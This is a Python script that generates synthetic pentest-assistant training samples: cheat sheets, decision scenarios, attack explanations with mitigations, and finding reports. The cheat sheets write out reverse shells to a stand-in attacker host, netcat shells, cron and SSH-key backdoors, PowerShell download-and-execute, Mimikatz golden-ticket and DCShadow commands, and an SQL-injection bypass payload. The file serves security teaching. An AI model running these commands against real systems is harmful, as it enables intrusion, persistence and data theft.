#!/usr/bin/env python3
"""
Final Push Sample Generator
Creates additional focused samples to reach 5000+ target
"""

import json
import random
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ============================================
# CHEAT SHEET / QUICK REFERENCE SAMPLES
# ============================================

def generate_cheatsheet_samples():
    """Generate quick reference cheat sheets"""
    samples = []
    
    cheatsheets = [
        {
            "topic": "Linux file permissions",
            "content": """Linux File Permissions Cheat Sheet

[PERMISSION STRUCTURE]
-rwxrwxrwx = type + owner + group + others
r = read (4), w = write (2), x = execute (1)

[COMMON PERMISSIONS]
755 = rwxr-xr-x (executable, owner can modify)
644 = rw-r--r-- (readable, owner can modify)
777 = rwxrwxrwx (all permissions - DANGEROUS)
600 = rw------- (owner only)
700 = rwx------ (owner only, executable)

[COMMANDS]
chmod 755 file       # Set specific permissions
chmod +x file        # Add execute permission
chmod -w file        # Remove write permission
chown user:group file  # Change owner
chgrp group file     # Change group

[SPECIAL PERMISSIONS]
SUID (4xxx): Execute as file owner
SGID (2xxx): Execute as file group
Sticky (1xxx): Only owner can delete

find / -perm -4000   # Find SUID files
find / -perm -2000   # Find SGID files"""
        },
        {
            "topic": "Windows CMD commands",
            "content": """Windows Command Line Cheat Sheet

[SYSTEM INFO]
systeminfo           # Detailed system info
hostname             # Computer name
whoami /all          # Current user + groups + privs
net user             # List local users
net localgroup administrators  # List admins

[NETWORKING]
ipconfig /all        # Network configuration
netstat -ano         # Active connections
arp -a               # ARP table
route print          # Routing table
nslookup host        # DNS lookup

[FILE OPERATIONS]
dir /s /b *.txt      # Find files recursively
type file.txt        # Display file contents
findstr /si password *.txt  # Search for string
icacls file          # Check file permissions
attrib +h file       # Hide file

[PROCESSES & SERVICES]
tasklist             # List processes
taskkill /PID 1234   # Kill process
sc query             # List services
wmic process list    # Detailed process list

[REGISTRY]
reg query HKLM\\...   # Query registry
reg add/delete       # Modify registry"""
        },
        {
            "topic": "Bash one-liners",
            "content": """Bash One-Liners for Pentesting

[NETWORK]
# Port scan without nmap
for p in {1..1000}; do (echo >/dev/tcp/host/$p) 2>/dev/null && echo "$p open"; done

# Reverse shell
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Download file
curl http://attacker/file -o file
wget http://attacker/file

[ENUMERATION]
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Find world-writable
find / -writable -type f 2>/dev/null

# Find config files
find / -name "*.conf" -o -name "*.config" 2>/dev/null

# Search for passwords
grep -r "password" / 2>/dev/null

[FILE TRANSFER]
# Python HTTP server
python3 -m http.server 8080

# Netcat file transfer
nc -lvnp 4444 > file  # Receiver
nc host 4444 < file   # Sender

[PERSISTENCE]
# Cron backdoor
echo "* * * * * /path/to/shell" | crontab -

# SSH key persistence
echo "attacker_key" >> ~/.ssh/authorized_keys"""
        },
        {
            "topic": "PowerShell for pentesters",
            "content": """PowerShell Pentesting Cheat Sheet

[EXECUTION POLICY BYPASS]
powershell -ep bypass
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

[DOWNLOAD & EXECUTE]
IEX(New-Object Net.WebClient).DownloadString('http://url/script.ps1')
IEX(IWR 'http://url/script.ps1')

[ENUMERATION]
Get-Process                  # Running processes
Get-Service                  # Services
Get-LocalUser                # Local users
Get-LocalGroupMember Administrators  # Admin members
Get-ScheduledTask            # Scheduled tasks
Get-ItemProperty 'HKLM:\\...'   # Registry

[FILE OPERATIONS]
Get-ChildItem -Recurse -Force   # List all files
Select-String -Path *.txt -Pattern "password"  # Search
Copy-Item src dest              # Copy file

[NETWORK]
Test-NetConnection host -Port 80   # Port check
Invoke-WebRequest http://url       # HTTP request
Get-NetTCPConnection               # Connections

[AMSI BYPASS (Educational)]
# Various techniques exist to bypass AMSI
# Search: "AMSI bypass techniques"

[ENCODED COMMANDS]
$cmd = "whoami"
$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded"""
        },
        {
            "topic": "Metasploit quick reference",
            "content": """Metasploit Quick Reference

[BASIC WORKFLOW]
msfconsole                    # Start Metasploit
search [keyword]              # Find modules
use [module]                  # Select module
info                          # Module information
show options                  # View settings
set RHOSTS target             # Set target
set LHOST attacker            # Set listener
exploit / run                 # Execute

[COMMON MODULES]
# Scanning
auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_ms17_010

# Exploitation
exploit/windows/smb/ms17_010_eternalblue
exploit/multi/handler

# Post-exploitation
post/windows/gather/credentials/credential_collector
post/multi/recon/local_exploit_suggester

[PAYLOADS]
windows/meterpreter/reverse_tcp    # Windows meterpreter
linux/x64/meterpreter/reverse_tcp  # Linux meterpreter
windows/shell_reverse_tcp          # Basic shell

[METERPRETER COMMANDS]
sysinfo                       # System info
getuid                        # Current user
getsystem                     # Attempt privesc
hashdump                      # Dump hashes
download/upload               # File transfer
shell                         # Drop to shell
migrate [PID]                 # Process migration

[SESSION MANAGEMENT]
sessions -l                   # List sessions
sessions -i [id]              # Interact
background                    # Background session"""
        },
        {
            "topic": "SQLMap reference",
            "content": """SQLMap Reference Guide

[BASIC USAGE]
sqlmap -u "http://target/page?id=1"

[DETECTION]
--level=5                     # More tests (1-5)
--risk=3                      # Riskier tests (1-3)
--technique=BEUSTQ            # Specific techniques

[DATABASE ENUMERATION]
--dbs                         # List databases
--tables -D dbname            # List tables
--columns -T table -D db      # List columns
--dump -T table -D db         # Dump data
--dump-all                    # Dump everything

[AUTHENTICATION]
--cookie="session=abc"        # Set cookie
--auth-type Basic             # HTTP auth
--auth-cred user:pass         # Credentials

[EVASION]
--random-agent                # Random user-agent
--tamper=space2comment        # Use tamper script
--delay=1                     # Delay between requests
--proxy=http://127.0.0.1:8080 # Use proxy

[OS INTERACTION]
--os-shell                    # Get OS shell
--os-pwn                      # Meterpreter shell
--file-read=/etc/passwd       # Read file
--file-write=local --file-dest=remote  # Write file

[OUTPUT]
-o                            # Output directory
--batch                       # Non-interactive
--flush-session               # Fresh start"""
        },
        {
            "topic": "Burp Suite tips",
            "content": """Burp Suite Essential Tips

[PROXY SETUP]
1. Configure browser: localhost:8080
2. Install Burp CA certificate for HTTPS
3. Enable interception as needed

[REPEATER WORKFLOW]
1. Right-click request → Send to Repeater
2. Modify parameters
3. Click "Send"
4. Analyze response

[INTRUDER ATTACKS]
Sniper: Single payload, multiple positions
Battering Ram: Same payload, all positions
Pitchfork: Parallel payload lists
Cluster Bomb: All payload combinations

[USEFUL EXTENSIONS]
- Logger++: Enhanced logging
- Autorize: Authorization testing
- JWT Editor: JWT manipulation
- Active Scan++: Enhanced scanning

[TIPS]
- Use scope to filter traffic
- Save requests to project
- Use comparer for diff analysis
- Configure out-of-scope to reduce noise
- Use match/replace for automated modifications

[KEYBOARD SHORTCUTS]
Ctrl+R: Send to Repeater
Ctrl+I: Send to Intruder
Ctrl+U: URL encode selection
Ctrl+Shift+U: URL decode"""
        },
        {
            "topic": "Hashcat modes",
            "content": """Hashcat Common Modes Reference

[HASH MODES (-m)]
0       MD5
100     SHA1
500     MD5crypt ($1$)
900     MD4
1000    NTLM
1100    Domain Cached Credentials (DCC)
1400    SHA256
1700    SHA512
1800    SHA512crypt ($6$)
2500    WPA-PBKDF2
3000    LM
3200    bcrypt ($2a$)
5500    NetNTLMv1
5600    NetNTLMv2
7500    Kerberos 5 AS-REQ Pre-Auth
13100   Kerberos 5 TGS-REP (Kerberoast)
18200   Kerberos 5 AS-REP (ASREP roast)

[ATTACK MODES (-a)]
0       Dictionary
1       Combination
3       Brute-force (mask)
6       Hybrid dictionary + mask
7       Hybrid mask + dictionary

[MASK CHARSET]
?l      lowercase (a-z)
?u      uppercase (A-Z)
?d      digits (0-9)
?s      special chars
?a      all printable
?b      all bytes (0x00-0xff)

[EXAMPLE COMMANDS]
# NTLM with dictionary
hashcat -m 1000 hash.txt rockyou.txt

# NTLM with rules
hashcat -m 1000 hash.txt rockyou.txt -r best64.rule

# 8-char brute force
hashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a?a?a"""
        },
        {
            "topic": "Netcat usage",
            "content": """Netcat (nc) Usage Guide

[BASIC CONNECTIVITY]
nc -v host port               # Connect to port
nc -vz host 1-1000            # Port scan
nc -l -p port                 # Listen on port

[FILE TRANSFER]
# Receiver (run first):
nc -l -p 4444 > received_file

# Sender:
nc target 4444 < file_to_send

[REVERSE SHELL]
# Attacker (listener):
nc -lvnp 4444

# Victim (Linux):
nc attacker 4444 -e /bin/bash

# If -e not available:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker 4444 > /tmp/f

[BIND SHELL]
# Victim (listener):
nc -lvnp 4444 -e /bin/bash

# Attacker (connect):
nc victim 4444

[PORT FORWARDING]
# Basic relay
nc -l -p 8080 | nc target 80

# With responses
mkfifo pipe
nc -l -p 8080 < pipe | nc target 80 > pipe

[FLAGS]
-l     Listen mode
-v     Verbose
-n     No DNS resolution
-p     Specify port
-e     Execute program
-u     UDP mode
-w     Timeout (seconds)
-z     Zero-I/O mode (scanning)"""
        },
        {
            "topic": "Nmap NSE scripts",
            "content": """Nmap NSE Scripts Reference

[CATEGORIES]
auth        Authentication scripts
broadcast   Broadcast discovery
brute       Brute force attacks
default     Default scripts (-sC)
discovery   Service discovery
dos         Denial of service (careful!)
exploit     Exploitation scripts
external    External services
fuzzer      Fuzzing scripts
intrusive   Intrusive scripts
malware     Malware detection
safe        Safe scripts
version     Version detection
vuln        Vulnerability detection

[COMMON SCRIPTS]
# SMB
smb-enum-users
smb-enum-shares
smb-vuln-ms17-010

# HTTP
http-enum
http-methods
http-vuln-*

# DNS
dns-brute
dns-zone-transfer

# SSL/TLS
ssl-enum-ciphers
ssl-heartbleed

[USAGE]
nmap --script [script] target
nmap --script [category] target
nmap --script "http-*" target
nmap --script-args [args] target

[EXAMPLES]
# Vulnerability scan
nmap --script vuln target

# SMB enumeration
nmap --script smb-* target

# HTTP enumeration
nmap --script http-enum,http-methods target

# All default + safe
nmap -sC target"""
        },
    ]
    
    for cs in cheatsheets:
        samples.append({
            "instruction": f"Give me a quick reference for {cs['topic']}.",
            "input": f"Need a cheat sheet for {cs['topic']} during pentest.",
            "output": cs["content"].strip()
        })
    
    return samples


def generate_decision_samples():
    """Generate decision-making samples"""
    samples = []
    
    decisions = [
        {
            "situation": "Found SQL injection but no database credentials visible",
            "options": ["Try to extract credentials", "Attempt file read", "Try OS command execution", "Enumerate database structure"],
            "recommended": "Enumerate database structure first to understand the schema, then attempt to extract credentials from user tables. If permissions allow, try file read for config files.",
            "risk": "MEDIUM - SQLi provides significant access potential"
        },
        {
            "situation": "Discovered internal admin panel without authentication",
            "options": ["Document and report", "Explore functionality", "Attempt to gain shell", "Check for sensitive data"],
            "recommended": "Document the finding, then carefully explore functionality to understand impact. Check for sensitive data exposure and potential for further exploitation.",
            "risk": "HIGH - Unauthenticated admin access is critical"
        },
        {
            "situation": "Gained user shell but need root/SYSTEM",
            "options": ["Run privilege escalation enumeration", "Check sudo permissions", "Look for stored credentials", "Search for kernel exploits"],
            "recommended": "Run automated enumeration (LinPEAS/WinPEAS) first to identify all potential vectors. Check sudo/services before attempting kernel exploits.",
            "risk": "MEDIUM - Privilege escalation extends access"
        },
        {
            "situation": "Found default credentials on network device",
            "options": ["Change the password", "Document only", "Extract configuration", "Pivot through device"],
            "recommended": "Document the finding with evidence. Extract configuration for analysis (may contain more credentials). Do NOT change the password - this could impact operations.",
            "risk": "HIGH - Network device compromise can enable pivoting"
        },
        {
            "situation": "Web application WAF blocking payloads",
            "options": ["Give up on this vector", "Try encoding bypass", "Use different attack type", "Find WAF bypass"],
            "recommended": "First identify what's being blocked, then try encoding (URL, double URL, unicode). If that fails, try alternative payloads or different vulnerability types.",
            "risk": "LOW - WAF bypass is about technique refinement"
        },
        {
            "situation": "Discovered credentials in GitHub repository",
            "options": ["Test credentials immediately", "Verify scope first", "Report to client", "Check for additional secrets"],
            "recommended": "Verify the credentials are in scope, then check repository history for additional secrets before testing. Document all findings even if credentials are old/rotated.",
            "risk": "MEDIUM-HIGH - Exposed credentials are significant findings"
        },
        {
            "situation": "EDR detected and killed payload",
            "options": ["Try different payload", "Disable EDR (if possible)", "Use different technique", "Note detection and move on"],
            "recommended": "Note the detection for reporting, then try alternative techniques: different payload format, execution method, or evasion techniques. Do not disable EDR without explicit authorization.",
            "risk": "LOW - Detection is expected in mature environments"
        },
        {
            "situation": "Found password hash but can't crack it",
            "options": ["Continue cracking attempts", "Try pass the hash", "Move to different target", "Look for hash in online databases"],
            "recommended": "Check online databases (hashes.org) first. If NTLM, try pass-the-hash instead of cracking. Expand wordlist or use rules if continuing cracking.",
            "risk": "LOW - Hash cracking is resource vs time tradeoff"
        },
        {
            "situation": "Client reports production system impact",
            "options": ["Stop testing immediately", "Investigate cause", "Continue on other targets", "Document incident"],
            "recommended": "STOP all testing immediately. Document exact actions leading to report. Contact client to discuss. Resume only after clearance.",
            "risk": "CRITICAL - Production impact is serious incident"
        },
        {
            "situation": "Discovered evidence of prior compromise",
            "options": ["Continue pentest normally", "Alert client immediately", "Investigate further", "Document and include in report"],
            "recommended": "IMMEDIATELY notify client of potential prior compromise. Preserve evidence, document findings. This may trigger incident response and change engagement scope.",
            "risk": "CRITICAL - Active breach requires immediate response"
        },
    ]
    
    for d in decisions:
        output = f"""Decision Analysis

[SITUATION]
{d["situation"]}

[OPTIONS CONSIDERED]
{chr(10).join(f"- {opt}" for opt in d["options"])}

[RECOMMENDED ACTION]
{d["recommended"]}

[RISK ASSESSMENT]
{d["risk"]}

[DECISION FACTORS]
1. Scope compliance - Is this within authorized boundaries?
2. Impact potential - What could go wrong?
3. Value - What do we gain from this action?
4. Detection - Will this trigger alerts?
5. Recovery - Can we roll back if needed?

[DOCUMENTATION]
- Record decision and rationale
- Document any risks accepted
- Note time and context"""
        
        samples.append({
            "instruction": f"What should I do in this situation: {d['situation']}",
            "input": f"Pentest situation: {d['situation']}\nOptions: {', '.join(d['options'])}",
            "output": output.strip()
        })
    
    return samples


def generate_explanation_samples():
    """Generate explanation/educational samples"""
    samples = []
    
    concepts = [
        {
            "term": "Pass the Hash",
            "explanation": """Pass the Hash (PtH) is an attack technique where an attacker uses the NTLM hash of a user's password instead of the plaintext password to authenticate.

[HOW IT WORKS]
1. Attacker compromises a system and extracts NTLM hashes
2. Using tools like Mimikatz, the hash is injected into a new logon session
3. The attacker can authenticate to other systems without knowing the actual password

[REQUIREMENTS]
- NTLM hash of target user
- Target must accept NTLM authentication
- Network access to target system

[TOOLS]
- Mimikatz: sekurlsa::pth
- Impacket: psexec.py -hashes
- CrackMapExec: cme smb -H

[DETECTION]
- Event ID 4624 with LogonType 3 or 9
- Network logons from unexpected sources
- NTLM authentication when Kerberos expected

[MITIGATION]
- Credential Guard on Windows 10+
- Protected Users security group
- Restrict NTLM usage
- Privileged Access Workstations"""
        },
        {
            "term": "Kerberoasting",
            "explanation": """Kerberoasting is an attack targeting service accounts in Active Directory by requesting and cracking Kerberos service tickets.

[HOW IT WORKS]
1. Attacker identifies service accounts with SPNs (Service Principal Names)
2. Requests TGS (Ticket Granting Service) ticket for those services
3. Extracts the ticket which is encrypted with the service account's hash
4. Cracks the ticket offline to recover the password

[REQUIREMENTS]
- Valid domain user account (any user can request service tickets)
- Service accounts with SPNs registered
- Weak service account passwords

[TOOLS]
- Rubeus: kerberoast
- Impacket: GetUserSPNs.py
- PowerView: Invoke-Kerberoast

[CRACKING]
hashcat -m 13100 tickets.txt wordlist.txt

[DETECTION]
- Event ID 4769 (TGS request) with unusual volume
- Requests for multiple services from single user
- RC4 encryption requests (downgrade)

[MITIGATION]
- Strong passwords (25+ chars) for service accounts
- Use MSA/gMSA (Managed Service Accounts)
- Monitor for Kerberoasting indicators"""
        },
        {
            "term": "Golden Ticket",
            "explanation": """A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) that provides complete domain access by impersonating any user.

[HOW IT WORKS]
1. Attacker obtains the KRBTGT account's NTLM hash (via DCSync or DC compromise)
2. Uses the hash to forge a TGT for any user, including Domain Admin
3. The forged ticket is accepted by any system in the domain
4. Valid until KRBTGT password is changed TWICE

[REQUIREMENTS]
- KRBTGT NTLM hash
- Domain SID
- Domain name

[CREATION]
Using Mimikatz:
```
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /id:500
```

[PERSISTENCE]
- Ticket valid for 10 years by default
- Survives password resets (except KRBTGT)
- Works even if user account deleted

[DETECTION]
- TGT with unusual lifetime
- TGT without corresponding AS-REQ
- Authentication anomalies in logs

[MITIGATION]
- Protect Domain Controllers
- Reset KRBTGT password periodically (TWICE)
- Monitor for DCSync attempts"""
        },
        {
            "term": "LLMNR/NBT-NS Poisoning",
            "explanation": """LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning exploits Windows name resolution fallback mechanisms.

[HOW IT WORKS]
1. When a host can't resolve a name via DNS, it broadcasts LLMNR/NBT-NS queries
2. Attacker on same network responds claiming to be the requested host
3. Victim sends credentials (usually NTLMv2 hash) to attacker
4. Attacker captures hash for offline cracking or relay attacks

[REQUIREMENTS]
- Network access (same broadcast domain as victims)
- LLMNR/NBT-NS not disabled on target network
- Users making typos or accessing unavailable resources

[TOOLS]
- Responder: responder -I eth0 -wrf
- Inveigh (PowerShell): Invoke-Inveigh

[CAPTURED DATA]
- NTLMv1/v2 hashes (crack with hashcat -m 5600)
- Potential for relay attacks (ntlmrelayx)

[DETECTION]
- Monitor for LLMNR/NBT-NS traffic
- Honeypot names that shouldn't resolve
- Network anomaly detection

[MITIGATION]
- Disable LLMNR and NBT-NS via GPO
- Enable SMB signing (prevents relay)
- Network segmentation"""
        },
        {
            "term": "Server-Side Request Forgery (SSRF)",
            "explanation": """SSRF is a vulnerability where an attacker can make a server perform requests to unintended locations, potentially accessing internal resources.

[HOW IT WORKS]
1. Application accepts user input for making HTTP requests (URLs, webhooks, etc.)
2. Attacker provides URL pointing to internal resource or localhost
3. Server makes request with its own privileges/network position
4. Internal data returned to attacker or actions performed

[COMMON TARGETS]
- http://localhost/admin
- http://169.254.169.254/ (cloud metadata)
- http://internal.corp.local/
- file:///etc/passwd

[IMPACT]
- Access internal services
- Cloud metadata exposure (credentials)
- Port scanning internal network
- Potential RCE via internal services

[BYPASS TECHNIQUES]
- IP encoding: 0x7f.0x0.0x0.0x1 = 127.0.0.1
- DNS rebinding
- URL parser confusion
- Protocol handlers: gopher://, dict://

[DETECTION]
- Monitor outbound requests from web servers
- Unusual DNS queries from web servers
- Requests to metadata endpoints

[MITIGATION]
- Whitelist allowed URLs/domains
- Block internal IP ranges
- Disable unnecessary URL schemes
- Use network segmentation"""
        },
        {
            "term": "DCShadow",
            "explanation": """DCShadow is a stealthy persistence technique that registers a rogue Domain Controller to push malicious changes to Active Directory.

[HOW IT WORKS]
1. Attacker registers compromised server as a DC in AD
2. Pushes malicious changes (backdoor admin, modify ACLs, etc.)
3. Changes replicate to legitimate DCs
4. Rogue DC unregisters, leaving minimal traces

[REQUIREMENTS]
- Domain Admin or equivalent privileges
- Direct network access to DC
- Mimikatz on compromised system

[EXECUTION]
Using Mimikatz (two sessions):
```
# Session 1: Register rogue DC
lsadump::dcshadow /object:user /attribute:... /value:...

# Session 2: Push changes
lsadump::dcshadow /push
```

[USE CASES]
- Add user to privileged groups
- Modify SID History
- Change password without logging
- Inject malicious SPNs

[DETECTION]
- New DCs appearing in AD
- Replication from unknown sources
- Event ID 4742 (computer account modified)

[MITIGATION]
- Monitor for new DC registrations
- Protect Domain Admins
- Advanced threat detection solutions"""
        },
    ]
    
    for c in concepts:
        samples.append({
            "instruction": f"Explain what {c['term']} is and how it works.",
            "input": f"I need to understand {c['term']} for penetration testing.",
            "output": c["explanation"].strip()
        })
    
    return samples


def generate_report_samples():
    """Generate report writing samples"""
    samples = []
    
    findings = [
        {
            "title": "SQL Injection in Login Form",
            "severity": "CRITICAL",
            "cvss": "9.8",
            "description": "The login form is vulnerable to SQL injection through the username parameter, allowing authentication bypass and data extraction.",
            "evidence": "Parameter: username\nPayload: admin' OR '1'='1'--\nResult: Authenticated as admin without password",
            "impact": "Attacker can bypass authentication, access all user accounts, extract sensitive data, and potentially execute system commands.",
            "remediation": "Use parameterized queries/prepared statements. Implement input validation. Apply principle of least privilege for database accounts."
        },
        {
            "title": "Default Administrator Credentials",
            "severity": "HIGH",
            "cvss": "8.1",
            "description": "The network switch at 10.0.0.1 is accessible with default credentials admin/admin.",
            "evidence": "Target: 10.0.0.1\nService: SSH (port 22)\nCredentials: admin/admin\nAccess Level: Full administrative",
            "impact": "Attacker can reconfigure network device, intercept traffic, create persistent backdoor, or disrupt network services.",
            "remediation": "Change default credentials immediately. Implement strong password policy. Use centralized authentication (RADIUS/TACACS+)."
        },
        {
            "title": "Missing Security Headers",
            "severity": "LOW",
            "cvss": "3.1",
            "description": "The web application does not implement security headers that protect against common web attacks.",
            "evidence": "Missing headers:\n- X-Content-Type-Options\n- X-Frame-Options\n- Content-Security-Policy\n- Strict-Transport-Security",
            "impact": "Application may be vulnerable to clickjacking, MIME-sniffing attacks, and certain XSS variants. Users may connect over insecure channels.",
            "remediation": "Implement all recommended security headers. Consider using a security-focused web server configuration template."
        },
    ]
    
    for f in findings:
        output = f"""Finding Report: {f["title"]}

[SEVERITY]
{f["severity"]} (CVSS: {f["cvss"]})

[DESCRIPTION]
{f["description"]}

[EVIDENCE]
{f["evidence"]}

[IMPACT]
{f["impact"]}

[REMEDIATION]
{f["remediation"]}

[REFERENCES]
- OWASP Testing Guide
- CWE Database
- Vendor security documentation

[VERIFICATION]
After remediation, retest to confirm:
1. Vulnerability no longer exploitable
2. Mitigation does not break functionality
3. Similar issues addressed throughout application"""
        
        samples.append({
            "instruction": f"Write a finding report for: {f['title']}",
            "input": f"Found {f['title'].lower()} during pentest. Severity: {f['severity']}",
            "output": output.strip()
        })
    
    return samples


def generate_conversation_samples():
    """Generate conversational Q&A samples"""
    samples = []
    
    conversations = [
        ("What's the first thing I should do when starting a pentest?", "Review the scope and rules of engagement. Confirm authorized targets, testing windows, and any excluded systems. Set up your testing environment and document everything from the start."),
        ("How do I know if I found something important?", "Consider impact: Can it lead to data breach? System compromise? Privilege escalation? If unsure, document it anyway. Better to report a minor finding than miss something critical."),
        ("Should I try harder if my exploit isn't working?", "First, verify you're targeting the right vulnerability. Check version numbers, permissions, and prerequisites. If it's still not working, try alternative techniques before moving on."),
        ("What if I accidentally cause damage?", "Stop immediately. Document what happened. Notify your point of contact. This is why we have scope agreements and insurance. Transparency is crucial."),
        ("How do I stay organized during a long engagement?", "Use a note-taking system (CherryTree, Obsidian). Take screenshots constantly. Log all commands. Create a timeline of activities. Review and organize daily."),
        ("When should I use automated vs manual testing?", "Use automated tools for coverage (scanning, fuzzing) but always verify findings manually. Manual testing is essential for logic flaws and complex vulnerabilities."),
        ("How do I explain technical findings to executives?", "Focus on business impact, not technical details. Use risk language they understand: data breach, financial loss, reputation damage. Provide clear remediation priorities."),
        ("What makes a good pentest report?", "Clear executive summary, reproducible findings, risk-based prioritization, actionable remediation steps, and supporting evidence. The reader should understand the risk and what to do about it."),
        ("How do I improve my pentesting skills?", "Practice on labs (HackTheBox, TryHackMe). Read writeups. Learn from others. Build a home lab. Get certifications. Participate in CTFs. Never stop learning."),
        ("What's the difference between pentest and red team?", "Pentests focus on finding vulnerabilities in defined scope. Red teams simulate real adversaries, testing detection and response, often with broader scope and stealth requirements."),
    ]
    
    for q, a in conversations:
        samples.append({
            "instruction": q,
            "input": "",
            "output": a
        })
    
    return samples


def main():
    """Generate all final push samples"""
    print("🚀 Generating final push samples...")
    
    all_samples = []
    
    generators = [
        ("cheatsheets", generate_cheatsheet_samples),
        ("decisions", generate_decision_samples),
        ("explanations", generate_explanation_samples),
        ("reports", generate_report_samples),
        ("conversations", generate_conversation_samples),
    ]
    
    for name, generator in generators:
        print(f"  Generating {name}...")
        samples = generator()
        all_samples.extend(samples)
        
        # Save category file
        category_file = OUTPUT_DIR / f"{name}.jsonl"
        with open(category_file, 'w') as f:
            for sample in samples:
                f.write(json.dumps(sample) + '\n')
        print(f"    ✓ {len(samples)} samples saved to {category_file.name}")
    
    # Save combined
    combined_file = OUTPUT_DIR / "final_push_combined.jsonl"
    with open(combined_file, 'w') as f:
        for sample in all_samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"\n✅ Total: {len(all_samples)} final push samples generated")
    return len(all_samples)


if __name__ == "__main__":
    main()
